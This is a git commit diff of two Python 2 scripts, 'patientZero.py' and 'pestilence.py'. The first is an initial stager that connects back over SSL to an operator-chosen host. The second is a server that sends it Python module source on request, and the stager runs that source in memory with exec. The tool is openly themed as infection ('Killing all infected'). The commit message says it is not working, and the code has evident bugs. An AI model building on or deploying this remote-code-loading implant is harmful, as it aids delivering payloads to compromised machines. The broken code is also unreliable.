6d11e69d10f79f7945b320a41663468dd813e32d
Lilith_Wyatt <lil.why2@gmail.com>
2016-03-27 15:56:44 -0400

    Not working, checking in

--- patientZero.py
+++ patientZero.py
@@ -1,5 +1,6 @@
 import multiprocessing
 import argparse
+import select
 import base64
 import socket
 import Queue
@@ -8,51 +9,152 @@ import sys
 import ssl
 import os
 
-
-progDesc = ("<(x.x)> ~patientZero.py~ <(x.x)>\n"
-            "********************************\n"
-            "Initial Stager for pestilence.py\n")         
-
-argParser = argparse.ArgumentParser(description=progDesc)
-argParser.add_argument("--phost", help="Pestilence IP to connect back to", default="127.0.0.1")
-argParser.add_argument("--pport", help="Pestilence port to connect back to",type=int, default=54189)
-argParser.add_argument("--log", help="Log session details to file")
-argParser.add_argument("--verify",help="Care about ssl cert",action="store_true",default=False)
-
 def log(inp, quiet=0):
     try:
-        argv.write(inp) 
+        argv.log.write(inp) 
     except:
         pass
     if not quiet:
         print inp 
     
+class patientZero():
+        def __init__(self,phost,port=54189,strict=False,keyfile="key.pem",certfile="cert.pem",stager=True):
+            self.phost = phost
+            self.port = port 
+            self.strict = strict
+            self.keyfile = keyfile
+            self.certfile= certfile
 
-def main():
-    #establish connection back or dipset 
-    try:
-        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        sock.connect((argv.phost,argv.pport))
-    except Exception as e:
-        log("[x.x] Unable to connect to pestilence source %s:%d" % (argv.phost,argv.pport)) 
-        log("[>.>] Patient Zero died: %s" % str(e))
-        sys.exit(-1)
+            self.new_mod = "" 
+            
+            #connection back to source
+            self.pestilence = self.contraction()
 
-    log("[^.^] Pestilence connection established")
+            if not stager:
+                self.standalone_mode()       
+
+
+        #make things a little pretty
+        def prompt(self):
+            sys.stdout.write("[x.x]> ")
+            sys.stdout.flush()
+                    
+
+        #testing/interactive mode 
+        def standalone_mode(self):
+
+            self.prompt()
+            timeout = .2
+            out = []
+            inp = ""
+
+            while True: 
+                outbound, inbound, _ = select.select([sys.stdin], [self.pestilence], [], timeout) 
+
+                if outbound:
+                    out = sys.stdin.readline()
+                    
+                    if out in [ "exit\n","quit\n","bye\n"]:
+                        break
+
+                    if len(out) > 1:
+                        self.pestilence.send("%s" % out)
+                    else:
+                        self.prompt()
+        
+                if inbound:
+                    inp = self.get_bytes(self.pestilence)
+                    if inp:
+                        sys.stdout.write("\n[<.<] %s" % inp)
+                        inp = ""
+                        self.prompt()
+
+            print "[^.^] Hope you enjoyed!"
+            sys.exit() 
+
+
+       
+        #initialize the connection back to source    
+        def contraction(self):
+            #establish connection back or dipset 
+            try:
+                sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                sock.connect((self.phost,self.port))
+            except Exception as e:
+                log("[x.x] Unable to connect to pestilence source %s:%d" % (self.phost,self.port)) 
+                log("[>.>] Patient Zero died: %s" % str(e))
+                sys.exit(-1)
+            try:
+                #Normal operations, don't really care
+                mode = ssl.CERT_OPTIONAL
+                if self.strict:
+                    mode = ssl.CERT_VERIFY
+
+                sslock = ssl.wrap_socket(sock,keyfile="key.pem",certfile="cert.pem") 
+            except Exception as e:
+                log("[x.x] Unable to wrap SSL socket %s:%d" % (self.phost,self.port)) 
+                log("[>.>] Patient Zero died: %s" % str(e))
+                sys.exit(-1) 
+
+            log("[^.^] Pestilence contracted!")
+            return sslock
+
     
+        #for receving allthe packets
+        def get_bytes(self,sock):
+            buf = ""
+            sock.settimeout(.2)
+            try:
+                while True:
+                    tmp = sock.recv(4096) 
+
+                    if len(tmp):
+                        buf+=tmp 
+                    if len(tmp) < 4096:
+                        break 
+            except:
+                pass
+            
+            return buf
+
+
+        def get_package(self,package_name):
+            self.pestilence.send("import %s\n" % package_name)
+            package = self.get_bytes(self.pestilence) 
+            print "[<.<] Package recieved: len:%d" % len(package)
+            print "[>.>] Package start:\n%s" % (package[0:100],)
+            mod = imp.new_module(package_name)
+            
+            exec package in mod.__dict__ 
+            sys.modules[package_name] = mod
+            import package_name
+            print "[^.^] Sucessfully contracted %s!" % (package_name,)
 
 
 
+#class ContaminantImporter(self):
 
 if __name__ == "__main__":
+
+
+    progDesc = ("<(x.x)> ~patientZero.py~ <(x.x)>\r\n"
+                "Initial Stager for pestilence.py\n")         
+
+    argParser = argparse.ArgumentParser(description=progDesc)
+    argParser.add_argument("phost", help="Pestilence IP to connect back to")
+    argParser.add_argument("-p","--port", help="Pestilence port to connect back to",type=int, default=54189)
+    argParser.add_argument("-l","--log", help="Log session details to file")
+    argParser.add_argument("-s","--strict",help="Care about ssl cert",action="store_true",default=False)
+    argParser.add_argument("-k","--keyfile",help="Specify key (.pem)",default="key.pem")
+    argParser.add_argument("-c","--certfile",help="Specify cert (.pem)",default="cert.pem")
+
+    if len(sys.argv) < 2:
+        sys.argv.append("-h") 
+    
     argv = argParser.parse_args()
-    if argv.log:
-        with open(argv.log,"w") as argv.log:
-            main()
-    else:
-        main()   
+    p = patientZero(argv.phost,argv.port,argv.strict,argv.keyfile,argv.certfile,stager=False) 
     
-    
+
 
 
 
--- pestilence.py
+++ pestilence.py
@@ -1,1 +1,196 @@
 #!/usr/bin/python
+import multiprocessing
+import argparse
+import select
+import base64
+import socket
+import Queue
+import imp
+import sys
+import ssl
+import os
+
+def log(inp, quiet=0):
+    try:
+        argv.log.write(inp)
+    except:
+        pass
+    if not quiet:
+        print inp
+
+
+class pestilence():
+    
+        def __init__(self,laddr,port,strict,keyfile,certfile):
+            self.laddr = laddr 
+            self.lport = port  
+            self.strict = strict
+            self.keyfile = keyfile
+            self.certfile = certfile
+            self.open_conns = []
+    
+
+            self.transmission_mode = None
+
+            self.symptoms = {
+                "import":self.get_package,
+                "set_mode":self.set_transmission_mode
+            }
+
+            self.transmission_server()
+
+
+### Connection handling
+
+        def transmission_server(self):
+            #establish connection back or dipset 
+            try:
+                sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                sock.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
+                sock.bind((self.laddr,self.lport))
+            except Exception as e:
+                log("[x.x] Unable to bind to %s:%d" % (self.laddr,self.lport))
+                log("[>.>] Pestilence died: %s" % str(e))
+                sys.exit(-1)
+    
+            sock.listen(20)
+        
+            while True:
+                try:
+                    cli_sock,cli_addr = sock.accept() 
+                    log("[!.!] Connection received from %s:%d" % (cli_addr[0],cli_addr[1]))
+                    cli_proc = multiprocessing.Process(target=self.transmit_handler,args=(cli_sock,cli_addr[0],cli_addr[1])) 
+                    self.open_conns.append(cli_proc)
+                    cli_proc.start()
+                except:
+                    print "[x.x] Killing all infected..." 
+                    for i in self.open_conns:
+                        i.terminate()
+                    print "[^.^] Hope you enjoyed!"
+                    sys.exit()
+
+
+
+        def transmit_handler(self,rsock,rhost,rport): 
+             comms_sock = ssl.wrap_socket(rsock,keyfile="key.pem",certfile="cert.pem",server_side=True)
+             debug_sock = None
+
+             try:
+                #Normal operations, don't really care
+                mode = ssl.CERT_OPTIONAL
+                if self.strict:
+                    mode = ssl.CERT_VERIFY
+
+             except Exception as e:
+                log("[x.x] Unable to wrap SSL socket %s:%d" % (rhost,rport))
+                log("[>.>] Pestilence transmission failed!: %s" % str(e))
+                sys.exit(-1)
+
+             try:
+                while True:
+                    __, inbound, __ = select.select([],[comms_sock],[]) 
+                    if inbound:
+                        inp = self.get_bytes(comms_sock)
+                        if inp:
+                            resp = self.inp_handle(inp)
+                        if resp:
+                            out = self.out_handle(resp)     
+                            comms_sock.send(out)
+                            resp = ""
+
+             except KeyboardInterrupt:
+                log("Connection to %s:%d closed!" % (rhost,rport)) 
+                pass
+
+### END Connection handling
+
+
+
+
+
+### Input and output hooks
+
+        def inp_handle(self,buf):
+            buf = buf.split(' ')     
+            cmd = buf[0]
+            args = buf[1:]
+
+            try:
+                resp = self.symptoms[cmd](args) 
+            except Exception as e:
+                resp = str(e) + "\n" 
+            return resp
+
+
+        
+        def out_handle(self,buf):
+            if self.transmission_mode:
+                buf = self.transmission_mode(buf)
+            
+            return buf
+
+### END Input and output hooks
+
+
+
+#### Definitions of Symptoms        
+
+        def set_transmission_mode(self,mode):
+            if mode == "base64":
+                self.transmission_mode = base64.b64encode            
+            else:
+                self.transmission_mode = None
+
+
+        def get_package(self,package):
+            fp,path,desc = imp.find_module(package)
+            if fp:
+                return fp.read()
+            else:
+                print "no file found. Prob dir?"
+                 
+
+#### END Definitions of Symptoms
+
+
+
+
+
+### Utility Functions
+
+        def get_bytes(self,sock):
+            buf = ""
+            sock.settimeout(.2)
+            try:
+                while True:
+                    tmp = sock.recv(4096)
+
+                    if len(tmp):
+                        buf+=tmp
+                    if len(tmp) < 4096:
+                        break
+            except:
+                pass
+
+            return buf
+ 
+
+### END Utility Functions
+
+if __name__ == "__main__":
+
+
+    progDesc = ("<(x.x)> ~pestilence.py~ <(x.x)>\r\n"
+                "Server for providing remote modules\n")
+
+    argParser = argparse.ArgumentParser(description=progDesc)
+    argParser.add_argument("-i","--ipaddr", help="IP to bind to",default="0.0.0.0")
+    argParser.add_argument("-p","--port", help="Port to bind to",type=int, default=54189)
+    argParser.add_argument("-l","--log", help="Log session details to file")
+    argParser.add_argument("-s","--strict",help="Care about ssl cert",action="store_true",default=False)
+    argParser.add_argument("-k","--keyfile",help="Specify key (.pem)",default="key.pem")
+    argParser.add_argument("-c","--certfile",help="Specify cert (.pem)",default="cert.pem")
+
+    argv = argParser.parse_args()
+    p = pestilence(argv.ipaddr,argv.port,argv.strict,argv.keyfile,argv.certfile)
+
